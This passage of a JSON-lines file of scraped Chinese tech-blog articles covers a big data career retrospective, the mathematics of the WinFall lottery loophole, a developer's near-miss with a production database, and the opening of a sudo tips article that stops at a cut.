{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/07/cecb3d3562d80f7f904e989de853d49d.png"], "title": "这两年在大数据行业中的工作总结", "create_date": "2018/07/01 ·", "praise_num": 1, "fav_num": 1, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/ztfjs/p/bigdata.html\">张泰峰</a>   </div><h2 id=\"w1\">写在前面</h2>\n<p>今年广州的六月，在经历了大雨的洗礼之后，一切都变得更加明朗起来，新的工作，新的人和事。懒惰让我变得更焦虑，焦虑促使我进步，程序员的焦虑大家应该都有共同的感觉，时代的步伐太快了，在这个环境下的软件开发一定会淘汰掉那些不懂得学习，懒惰的人。</p>\n<p>希望跟大家共勉。</p>\n<p>今天呢，博主主要回顾这两年来，在大数据行业公司从事大数据类的前端开发的工作。最近刚刚换了一份工作，把我的经验稍作总结分享给大家，有什么建议大家在评论区踊跃。 谢谢。</p>\n<p>今天的主题，主要是从大数据开发的角度，到大数据治理的必要性，再到图形化建模的畅想，最后在数据质量的把关，然后到大数据可视化的应用，博主总结两年的见闻，和我学习的成果，也不知理解有无偏差吧，希望大家能给出建议。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/cecb3d3562d80f7f904e989de853d49d.png\" alt=\"\"></p>\n<h2 id=\"w1\">大数据开发</h2>\n<p>大数据开发，有几个阶段：</p>\n<p>1.数据采集【原始数据】</p>\n<p>2.数据汇聚【经过清洗合并的可用数据】</p>\n<p>3.数据转换和映射【经过分类，提取的专项主题数据】</p>\n<p>4.数据应用 【提供api 智能系统  应用系统等】</p>\n<p><strong>数据采集</strong></p>\n<p>数据采集有线上和线下两种方式，线上一般通过爬虫、通过抓取，或者通过已有应用系统的采集，在这个阶段，我们可以做一个大数据采集平台，依托自动爬虫（使用python或者nodejs制作爬虫软件），ETL工具、或者自定义的抽取转换引擎，从文件中、数据库中、网页中专项爬取数据，如果这一步通过自动化系统来做的话，可以很方便的管理所有的原始数据，并且从数据的开始对数据进行标签采集，可以规范开发人员的工作。并且目标数据源可以更方便的管理。</p>\n<p>数据采集的难点在于多数据源，例如mysql、postgresql、sqlserver 、 mongodb 、sqllite。还有本地文件、excel统计文档、甚至是doc文件。如何将他们规整的、有方案的整理进我们的大数据流程中也是必不可缺的一环。</p>\n<p><strong>数据汇聚</strong></p>\n<p>数据的汇聚是大数据流程最关键的一步，你可以在这里加上数据标准化，你也可以在这里做数据清洗，数据合并，还可以在这一步将数据存档，将确认可用的数据经过可监控的流程进行整理归类，这里产出的所有数据就是整个公司的数据资产了，到了一定的量就是一笔固定资产。</p>\n<p>数据汇聚的难点在于如何标准化数据，例如表名标准化，表的标签分类，表的用途，数据的量，是否有数据增量？，数据是否可用？ 需要在业务上下很大的功夫，必要时还要引入智能化处理，例如根据内容训练结果自动打标签，自动分配推荐表名、表字段名等。还有如何从原始数据中导入数据等。</p>\n<p><strong>数据转换和映射</strong></p>\n<p>经过数据汇聚的数据资产如何提供给具体的使用方使用？在这一步，主要就是考虑数据如何应用，如何将两个？三个？数据表转换成一张能够提供服务的数据。然后定期更新增量。</p>\n<p>经过前面的那几步，在这一步难点并不太多了，如何转换数据与如何清洗数据、标准数据无二，将两个字段的值转换成一个字段，或者根据多个可用表统计出一张图表数据等等。</p>\n<p><strong>数据应用</strong></p>\n<p>数据的应用方式很多，有对外的、有对内的，如果拥有了前期的大量数据资产，通过restful API提供给用户？或者提供流式引擎 KAFKA 给应用消费? 或者直接组成专题数据，供自己的应用查询？这里对数据资产的要求比较高，所以前期的工作做好了，这里的自由度很高。</p>\n<p><strong>总结：大数据开发的难点</strong></p>\n<p>大数据开发的难点主要是监控，怎么样规划开发人员的工作？开发人员随随便便采集了一堆垃圾数据，并且直连数据库。 短期来看，这些问题比较小，可以矫正。 但是在资产的量不断增加的时候，这就是一颗定时炸弹，随时会引爆，然后引发一系列对数据资产的影响，例如数据混乱带来的就是数据资产的价值下降，客户信任度变低。</p>\n<p>如何监控开发人员的开发流程？</p>\n<p>答案只能是自动化平台，只有自动化平台能够做到让开发人员感到舒心的同时，接受新的事务，抛弃手动时代。</p>\n<p>这就是前端开发工程师在大数据行业中所占有的优势点，如何制作交互良好的可视化操作界面？如何将现有的工作流程、工作需求变成一个个的可视化操作界面？ 可不可以使用智能化取代一些无脑的操作？</p>\n<p>从一定意义上来说，大数据开发中，我个人认为前端开发工程师占据着更重要的位置，仅次于大数据开发工程师。至于后台开发，系统开发是第三位的。好的交互至关重要，如何转换数据，如何抽取数据，一定程度上，都是有先人踩过的坑，例如kettle，再例如kafka，pipeline ，解决方案众多。关键是如何交互？ 怎么样变现为可视化界面？ 这是一个重要的课题。</p>\n<p>现有的各位朋友的侧重点不同，认为前端的角色都是可有可无，我觉得是错误的，后台的确很重要，但是后台的解决方案多。 前端实际的地位更重要，但是基本无开源的解决方案，如果不够重视前端开发， 面临的问题就是交互很烂，界面烂，体验差，导致开发人员的排斥，而可视化这块的知识点众多，对开发人员的素质要求更高。</p>\n<h2 id=\"w1\">大数据治理</h2>\n<p>大数据治理应该贯穿整个大数据开发流程，它有扮演着重要的角色，浅略的介绍几点：</p>\n<p>数据血缘</p>\n<p>数据质量审查</p>\n<p>全平台监控</p>\n<p><strong>数据血缘</strong></p>\n<p>从数据血缘说起，数据血缘应该是大数据治理的入口，通过一张表，能够清晰看见它的来龙去脉，字段的拆分，清洗过程，表的流转，数据的量的变化，都应该从数据血缘出发，我个人认为，大数据治理整个的目标就是这个数据血缘，从数据血缘能够有监控全局的能力。<strong><br>\n</strong></p>\n<p>数据血缘是依托于大数据开发过程的，它包围着整个大数据开发过程，每一步开发的历史，数据导入的历史，都应该有相应的记录，数据血缘在数据资产有一定规模时，基本必不可少。</p>\n<p><strong>数据质量审查</strong></p>\n<p>数据开发中，每一个模型（表）创建的结束，都应该有一个数据质量审查的过程，在体系大的环境中，还应该在关键步骤添加审批，例如在数据转换和映射这一步，涉及到客户的数据提供，应该建立一个完善的数据质量审查制度，帮助企业第一时间发现数据存在的问题，在数据发生问题时也能第一时间看到问题的所在，并从根源解决问题，而不是盲目的通过连接数据库一遍一遍的查询sql。</p>\n<p><strong>全平台监控</strong></p>\n<p>监控呢，其实包含了很多的点，例如应用监控，数据监控，预警系统，工单系统等，对我们接管的每个数据源、数据表都需要做到实时监控，一旦发生殆机，或者发生停电，能够第一时间电话或者短信通知到具体负责人，这里可以借鉴一些自动化运维平台的经验的，监控约等于运维，好的监控提供的数据资产的保护也是很重要的。</p>\n<h2 id=\"w1\"></h2>\n<h2 id=\"w1\">大数据可视化</h2>\n<p>大数据可视化不仅仅是图表的展现，大数据可视化不仅仅是图表的展现，大数据可视化不仅仅是图表的展现，重要的事说三遍，大数据可视化归类的数据开发中，有一部分属于应用类，有一部分属于开发类。</p>\n<p>在开发中，大数据可视化扮演的是可视化操作的角色， 如何通过可视化的模式建立模型？ 如何通过拖拉拽，或者立体操作来实现数据质量的可操作性？ 画两个表格加几个按钮实现复杂的操作流程是不现实的。</p>\n<p>在可视化应用中，更多的也有如何转换数据，如何展示数据，图表是其中的一部分，平时更多的工作还是对数据的分析，怎么样更直观的表达数据？这需要对数据有深刻的理解，对业务有深刻的理解，才能做出合适的可视化应用。</p>\n<p><strong>智能的可视化平台</strong></p>\n<p>可视化是可以被再可视化的，例如superset，通过操作sql实现图表，有一些产品甚至能做到根据数据的内容智能分类，推荐图表类型，实时的进行可视化开发，这样的功能才是可视化现有的发展方向，我们需要大量的可视化内容来对公司发生产出，例如服装行业，销售部门：进货出货，颜色搭配对用户的影响，季节对选择的影响   生产部门：布料价格走势？  产能和效率的数据统计？  等等，每一个部门都可以有一个数据大屏，可以通过平台任意规划自己的大屏，所有人每天能够关注到自己的领域动向，这才是大数据可视化应用的具体意义。</p>\n<h2 id=\"w1\">写在最后</h2>\n<p>洋洋洒洒写了很多，对我近两年的所见所闻所学所想进行了一些总结，有些童鞋会问，不是技术么？为什么没有代码？   博主要说，代码博主要学的，要写的，但是与工作无关，代码是我个人的技能，个人傍身，实现个人想法的重要技能。 但是，代码与业务的关系不大，在工作中，懂业务的人代码写的更好，因为他知道公司想要什么。 如果你业务很差，那也没关系，你代码好就行了呀，根据别人的交代干活，也是很不错的。技术和业务是相辅相成的，稍后博主总结代码的精进。</p>\n<p>写完了，博主的焦虑一丝未少，我的代码规范性不够，目前技术栈js、java、nodejs、python 。</p>\n<p>主业js熟练度80%吧，正在研究阮一峰的es6（看的差不多）和vuejs的源码（有点搁浅），vuejs算是中等，css和布局方面可以说还可以，另外d3.js，go.js都是处于会用，能干活。 nodejs呢，express和koa无问题，看过一些express的源代码，还写过两个中间件。</p>\n<p>java、python都处于能做项目的程度，目前也不想抽很多精力去深入它们，就想要保持在想用能用的地步吧。</p>\n<p>未来的几年，博主努力工作，多学学人工智能、大数据开发的知识，未来这块应该还有一些热度的吧。</p>\n<p>最后，和大家共勉，更希望大家能给一些规划建议，三人行，必有我师焉。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114185\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114185votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114185\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,大数据", "url": "http://blog.jobbole.com/114185/", "url_obj_id": "d2a28d4e4a9004a7b3c4643177084415"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/f58960421a4971f3faf2694f8206948d.jpg"], "title": "彩票的数学知识", "create_date": "2018/04/17 ·", "praise_num": 1, "fav_num": 2, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://ruanyifeng.com/blog/2018/04/lottery-mathematics.html\">阮一峰的网络日志</a>   </div><div id=\"main-content\"><!-- div class=\"asset-body\" -->彩票怎样才能中奖？\n<p><!-- /div --> <!-- div id=\"more\" class=\"asset-more\" --></p>\n<p>理论上，只能靠运气。但是，如果规则设计得不好，就可以钻漏洞。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/ccb3d06456d33d07934f9f3d1c103f96.jpg\" alt=\"\"></p>\n<p>2005年2月，美国的一个彩票品种，就出现了漏洞，被麻省理工学院的学生发现了。随后的七年，这个学生反复购买这个品种，一共赚到了300万美元。</p>\n<p>本文介绍他怎么做的，以及其中的数学原理。我依据的材料，主要来自数学教授 Jordan Ellenberg 在斯坦福大学的一次演讲（<a href=\"https://www.youtube.com/watch?v=QtlmXoHpNyI\">Youtube</a>）。</p>\n<h1>一、期望值</h1>\n<p>彩票最重要的数学概念，叫做”期望值”（expected value），即同一种行为多次重复以后，所能得到的平均收益。</p>\n<p>举例来说，如果每次抽奖需要2元，假设200次抽奖可以中奖一次，奖金为300元。那么，你花了2000元，一共抽奖1000次，中奖了5次，奖金为1500元。</p>\n<p>也就是说，1000次抽奖的总收益是1500元，每次的平均收益是1.5元，这就是期望值。它的计算公式如下。</p>\n<blockquote><p>期望值 = 300 * (1 / 200) + 0 * (199 / 200) = 1.5</p></blockquote>\n<p>期望值是1.5元，但是每次抽奖成本2元，于是净亏损0.5元。</p>\n<p>一看就知道，这个事情是不划算的，做得越多，越不划算。偶尔买一次彩票，倒也算了；如果你一天到晚不断买彩票，就肯定会亏很多钱（上例是每200次亏100元）。</p>\n<p>总之，期望值是衡量彩票收益的一个关键指标。</p>\n<h1>二、马萨诸塞州的 WinFall 彩票</h1>\n<p>美国马萨诸塞州有一个彩票品种，叫做 WinFall。它的规则很简单：1到48里面，你猜6个数字，猜中就有奖。</p>\n<blockquote>\n<ul>\n<li>四等奖（6个猜中2个）：奖金2元</li>\n<li>三等奖（6个猜中3个）：奖金5元</li>\n<li>二等奖（6个猜中4个）：奖金150元</li>\n<li>一等奖（6个猜中5个）：奖金4000元</li>\n<li>特等奖（6个猜中6个）：奖金池剩余的全部奖金</li>\n</ul>\n</blockquote>\n<p>有一期，一共卖出了930万张彩票，其中特等奖一个，奖金100万美元，一等奖238个，二等奖11625个，三等奖19.8万个，四等奖136.8万个。</p>\n<p>计算可知，这种彩票的期望值是0.798元。</p>\n<blockquote><p>期望值 =<br>\n100万 * ( 1 / 930万) +<br>\n4000 * ( 238 / 930万) +<br>\n150 * (11625 / 930万) +<br>\n5 * (19.8万 / 930万) +<br>\n2 * (136.8万 / 930万 )<br>\n= 0.798</p></blockquote>\n<p>每张彩票的价格是2元，可是平均收益只有0.798元，连一半都不到，可见这种彩票是非常不划算的。因此没有吸引力，购买这种彩票的民众不断减少。</p>\n<p>州政府很着急，因为政府从彩票抽成20%（每张0.4元）。如果销售量减少，政府的收益也会减少。于是，政府为了增加这种彩票的吸引力，决定修改彩票规则。</p>\n<h1>三、新规则</h1>\n<p>新的规则是，如果当期没有特等奖（没人猜中６个数字），那么奖金会分配给一等奖、二等奖、三等奖的得主，各奖项新的中奖金额如下。</p>\n<blockquote>\n<ul>\n<li>一等奖（6中5）：50000元</li>\n<li>二等奖（6中4）：2385元</li>\n<li>三等奖（6中3）：60元</li>\n</ul>\n</blockquote>\n<p>还是使用前面的中奖率，计算期望值。</p>\n<blockquote><p>期望值 =<br>\n50000 * ( 238 / 930万) +<br>\n2385 * (11625 / 930万) +<br>\n60 * (19.8万 / 930万) +<br>\n= 5.53</p></blockquote>\n<p>每张彩票的价格还是2元，但是期望值变成了5.53元。购买这种彩票就变得非常划算，大量购买的话， 可以得到2.5倍的收益。之所以期望值大于彩票的成本，是因为奖金池还包含前期剩余的奖金。</p>\n<p>麻省理工学院的一个学生，发现了这一点。他凑了5000元购买彩票，结果中了将近15000元！</p>\n<h1>四、如何选择号码？</h1>\n<p>现在我们知道，新规则的彩票是有利可图的，可以大量购买。但是，还有一个问题，应该怎么选择号码，才能保证收益？也就是说，48个号码里面，你应该选择哪6个号码，才能收益最大化？</p>\n<p>毕竟你不能购买所有彩票，因为彩票的收益来自没中奖的那些人。你只能购买一部分彩票，设法使得自己购买的号码有最大的中奖可能。</p>\n<p>为了简化思考，让我们考虑一种简单的情况。1到7里面猜三个数字，奖金如下。</p>\n<blockquote>\n<ul>\n<li>猜中3个：奖金6元</li>\n<li>猜中2个：奖金2元</li>\n<li>猜中1个：无奖金</li>\n</ul>\n</blockquote>\n<p>你可以同时选择七种组合（即购买七张彩票），请问应该如何选择号码？</p>\n<h1>五、组合数公式</h1>\n<p>首先，让我们考虑一下，1到7这七个数字里面，三个数字的组合一共有多少种？这在数学里面，叫做<a href=\"https://baike.baidu.com/item/%E7%BB%84%E5%90%88%E6%95%B0%E5%85%AC%E5%BC%8F\">组合数公式</a>。</p>\n<blockquote><p>组合数公式是指从 m 个不同元素中，取出 n（n ≤ m）个元素的所有组合的个数，用符号 c(m, n) 表示。</p></blockquote>\n<p>它的计算公式如下。</p>\n<blockquote><p>c(m, n) = m! / n! * (m – n)!</p></blockquote>\n<p>上面公式中，感叹号表示阶乘，比如<code>4!</code> 等于<code>4 * 3 * 2 * 1</code> 。</p>\n<p>按照上面的定义，七个数字里面的三个号码的组合，共有<code>c(7, 3)</code>个。</p>\n<blockquote><p>c(7, 3) = 7! / 3! * (7 – 3)! = 35</p></blockquote>\n<p>这就是说，三个数字的组合共有 35 种。我们可以把它们全部列出来。</p>\n<blockquote><p>123 124 125 126 127<br>\n134 135 136 137<br>\n145 146 147<br>\n156 157<br>\n167<br>\n234 235 236 237<br>\n245 246 247<br>\n256 257<br>\n267<br>\n345 346 347<br>\n356 357<br>\n367<br>\n456 457<br>\n467<br>\n567</p></blockquote>\n<p>上面是所有35种可能的组合，你必须从中选出7种。请问应该选择哪七种？</p>\n<h1>六、最佳组合</h1>\n<p>答案是下面这七种组合。</p>\n<blockquote><p>123 145 167 247 256 346 357</p></blockquote>\n<p>这七张彩票能让你的收益最大化。因为，不管最后的中奖号码是什么，它们可以保证你总是获得6元奖金。如果中奖号码是123，那么你拿到头奖6元；如果中奖号码是367，那么167、346、357这三张彩票各自猜中两个号码，你中了三个小奖，奖金总额也是6元。</p>\n<p>仔细观察这七张彩票，你会发现它们是精心选择的：每个数字都正好出现三次。这导致你要么中一个大奖，要么中三个小奖。</p>\n<h1>七、几何选择法</h1>\n<p>这七张彩票是怎么选出的呢？</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/4cad5b6d3d7a5f64bb1d7a55679c2f3d.gif\" alt=\"\"></p>\n<p>有一种几何方法，可以非常简单地做到这一点。七个号码就是七个点，把它们用直线连起来，每根线上只能有三个点，而每个点出现在三根线上。画成上面的形状，就得到了七根线（内部的圆也算一根线）。然后，记录一下每根线上的号码，很简单就选出了七张彩票。</p>\n<p>更严谨的证明是这样的：1到7这七个数字，共有21种两个数字的组合（<code>C(7, 2)</code>），这意味着只要把这21种组合都买全了，就可以保证中三个小奖。因为三个中奖号码里面，共有三种两个数字的组合（比如中奖号码是367，那么36、37、67都可以中小奖）。另一方面，由于每张彩票包含三个号码，即包含三种两个数字的组合，那么最少只要买7张彩票就能覆盖全部21种组合。</p>\n<h1>八、实际的策略</h1>\n<p>回到前面的问题，马萨诸塞州的彩票应该怎么买？</p>\n<p>6个号码只要猜中4个，就可以中二等奖，只要把所有四个号码的组合都买了，就可以确保中15个二等奖（6个中奖号码共有15个四个号码的组合<code>C(6, 4)</code>）。</p>\n<p>48个号码里面共有194580种四个号码的组合（<code>C(48, 4)</code>），既然一张彩票包含15种组合，那么最少购买12972张彩票就够了（<code>194580 / 15 = 12972</code>），就可以包含所有四个号码的组合。如果有兴趣的话，你可以写一个程序，算出包含这194580种组合的所有彩票。</p>\n<p>购买12972张彩票，需要25944元（<code>12972 * 2</code>）。根据前面的奖金额，二等奖的奖金是2385元，那么15个二等奖就是35775元（<code>2385 * 15</code>）。因此，投入25944元，可以无风险地获得35775元。当然，这样做的前提是，当期没人猜中特等奖，否则奖金就会被大大稀释。</p>\n<p><!-- /div --></p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113901\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113901votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113901\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,彩票", "url": "http://blog.jobbole.com/113901/", "url_obj_id": "984d2095c68d0891012669fd1bb21e2d"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2011/12/i-accidentally-deleted-all-our-data.jpg"], "title": "我曾误删了公司的数据库，但还是活下来了", "create_date": "2018/04/21 ·", "praise_num": 1, "fav_num": 1, "comment_num": 4, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://medium.freecodecamp.org/the-times-ive-messed-up-as-a-developer-3c0bcaa1afd6\">Zachary Kuhn</a>   译文出处：<a target=\"_blank\" href=\"http://36kr.com/p/5129182.html\">36氪</a>   </div><p>上周我与同事们进行了一次关于职业生涯中搞砸了一些事情的简短谈话。这确实会沦为他人笑柄，却更给我们带来了珍贵的教训。重要的是，我们应该分享那些曾经的错误，这样其他人就可以从其中学习。下文是最近在我身上发生的例子。</p>\n<h3>为什么有如此多误删生产数据库的事情发生？</h3>\n<p>几个月前，Reddit上有<a href=\"https://www.reddit.com/r/cscareerquestions/comments/6ez8ag/accidentally_destroyed_production_database_on/\">一篇文章</a>，讲了一名初级开发人员在上班的第一天就删除了生产数据库的事。我们都很憷于读到这类犯了这类无法让人忘却的大错误的文章。因为我们离这些也不远，而大多数人都是“死里逃生”。</p>\n<p>在我的第一份工作中，一位高级数据库管理员在上班第一天就误删了生产数据库。这类故事情节比比皆是。这个团队从一个星期的备份中恢复了他导致的错误，并让他继续工作。十年后，他们依然将其作为笑点。</p>\n<p>今年早些时候，我被派去检查一个客户的生产数据上的问题。他们进行了小范围的非公开测试，结果网站上没有显示任何内容。我想查查是否是存在漏洞或是易损性问题导致了这一结果。</p>\n<p>我通过了生产机器上的签名环节，然后打开了数据库。内容库（articles table）内空空如也。这证实了我们在网站上看到的情况是真实的。</p>\n<p>用户库（users table）内依然有用户数据存在。真让人奇怪。所以情况是我们丢失了所有内容，但是至少测试用户的信息依然存在。我们给出的解释是这是一个测试行为，所以这些事情有可能发生。</p>\n<p>接下来的几分钟一片混乱。我不记得自己做了什么。我不认为自己笨到在控制台上执行了删除用户库的操作。但是事实就是这么发生了，现在后台既没有了内容库，也没有了用户库。这真实下了我一大跳。</p>\n<p>然后我的大脑就开始转动起来思考如何解决这个问题。我真的把用户库给删掉了吗？是的。我们存备份了吗？没有。我们应该如何告诉客户这个事情？不知道。</p>\n<p>我犹记得自己走向项目经理那里，坐在她身边，向她解释了发生了什么事情时的场面。因为我们的内容库中没有内容，这就是为什么网站上空空如也的原因。同时，我还删除了用户库。他们现在需要重新邀请所有的用户，如果他们能够弄清楚谁是谁。</p>\n<p>我回到了自己的办公室，垂头丧气。</p>\n<p>不过，我还是没有接受这件事。我们一开始是如何失去这些东西的？</p>\n<p>我开始不停地往深处想。半是为了否认这件事，半是想要挽回面子。不久，我注意到了一些重要事情。</p>\n<p>在服务器上还存在着其他5个数据库。其中一个数据库的名字和我刚才看到的数据库名字很像。</p>\n<p>当我查看这个数据库的时候，发现所有的内容都在里面。用户库也安然无恙。结果证明，是一个配置变动无意中改变了生产设置，使站点指向了一个全新的数据库。我之前所看的用户信息是什么？种子数据。</p>\n<p>真是谢天谢地。早上的神经紧张和胃酸让我觉得很不舒服，但是我们“恢复”了数据，并在坏消息传开之前找到了真正的问题。</p>\n<p>从这件事中可以吸取很多教训。其中一点是关于最简单原则：我们总是在做的备份，也许是开发人员最有成效的挽救药。</p>\n<h3>继续前进但不要冲得过前</h3>\n<p>我最近犯的一个错误不太引人注目。事实上，这是一个经由小错误所引起的小错误最终导致了一场混乱的故事。</p>\n<p>我们面临的是一个时间紧迫的项目。</p>\n<p>在初次会议上，我们团队一致认为完成它会花费比预定时间多一倍的时间。这个最后期限一开始就对我们产生影响，让我宽松地通过了身份认证部分而留有更多时间去关注客户所实际关注的功能设计。</p>\n<p>我只是在一个单一页面测试了身份验证测试，但是当时还不了解它们将如何被组合在一起。</p>\n<p>把它单列出来是我做的一个错误决定。我忽略了一些重要事情：</p>\n<ol class=\" list-paddingleft-2\">\n<li>用户在登陆之后会从cookie中加载内容，但是这个页面却试图在没有任何等待的情况下进行加载。根据事件的发生顺序，用户会得到带来服务器的反映，说其是未经授权的。</li>\n<li>身份验证也未检查令牌是否过期。如果用户不经常访问这个网站。那么当其再一次访问时，网站需要用户登出再登入才会运行。</li>\n<li>令牌应该基于每个请求进行更新，但是我从未花费时间去理解其发生前后的规则。所以，这又产生了一个时间问题。如果我们同时发送了几个请求，根据它们返回的顺序，用户会得到那个在后来的请求中无法使用的令牌。</li>\n</ol>\n<p>我们匆匆忙忙地赶着项目，却仍花费了比规定多一倍的时间。区别之处在于有更多的漏洞，并需要花更多时间去跟踪并修复这些漏洞。</p>\n<p>这使我感到窘迫。之后因为整件事情变得比较糟糕哦而让我在公众场合感到羞愧。</p>\n<p>我想说的是：在此之后，我花费了时间去学习认证程序。我现在了解了OAuth、JWT、刷新令牌和到期行为。我仔细研究了其他人所编写的身份验证代码。我能够在不同的语言和框架中建构身份验证程序。</p>\n<h3>将失败转化为未来的成功</h3>\n<p>这是我从那些表现糟糕的事情中所获得的经验。如果你愿意，那么几乎所有好的结果都会由此而来。</p>\n<p>如果有人能从自己的错误中汲取教训，那么他就会比现在更优秀。我试着不去打击那些第一次犯错误的队友。他们通常都知道自己把事情搞的一团糟。</p>\n<p>我也正尝试不对那些不断犯同样错误的人施加压力。他们仍然值得同情。</p>\n<p>如果在错误中做到这4点，那么你就会不断成长：</p>\n<ol class=\" list-paddingleft-2\">\n<li>嘲笑自己。</li>\n<li>从中汲取经验教训。</li>\n<li>改正错误。</li>\n<li>分享自己的错误，让其他人也有所收获。</li>\n</ol>\n<p>最后，我想讲一个关于错误价值的轶事。20世纪初，IBM的首席执行官托马斯·J·沃森曾遇到过一名员工，这名员工的一系列糟糕决策让公司付出了巨大代价。当沃森被问到是否会解雇这名员工时，他回应道：</p>\n<blockquote><p>“不，我刚在他身上花了60万美元的培训费。为什么要让别人白白捡去这个便宜？”</p></blockquote>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113909\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113909votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113909\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 4 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,数据库", "url": "http://blog.jobbole.com/113909/", "url_obj_id": "e471e2a60cb82e666c724e013e14e93b"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/62b7a1070a67d4ff08c977612aa47ef3.jpg"], "title": "Linux 系统中 sudo 命令的 10 个技巧", "create_date": "2018/04/21 ·", "praise_num": 1, "fav_num": 2, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linuxtechi.com/quick-tips-sudo-command-linux-systems/\">Pradeep Kumar</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9559-1.html\">Linux中国/szcf-weiya</a>   </div><p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/62b7a1070a67d4ff08c977612aa47ef3.jpg\"></p>\n<h3 id=\"toc_1\">概览</h3>\n<p><code>sudo</code> 表示 “<strong>s</strong>uper<strong>u</strong>ser <strong>do</strong>”。 它允许已验证的用户以其他用户的身份来运行命令。其他用户可以是普通用户或者超级用户。然而，大部分时候我们用它来以提升的权限来运行命令。</p>\n<p><code>sudo</code> 命令与安全策略配合使用，默认安全策略是 <code>sudoers</code>，可以通过文件 <code>/etc/sudoers</code> 来配置。其安全策略具有高度可拓展性。人们可以开发和分发他们自己的安全策略作为插件。</p>\n<h3 id=\"toc_2\">与 su 的区别</h3>\n<p>在 GNU/Linux 中，有两种方式可以用提升的权限来运行命令：</p>\n<ul>\n<li>使用 <code>su</code> 命令</li>\n<li>使用 <code>sudo</code> 命令</li>\n</ul>\n<p><code>su</code> 表示 “<strong>s</strong>witch <strong>u</strong>ser”。使用 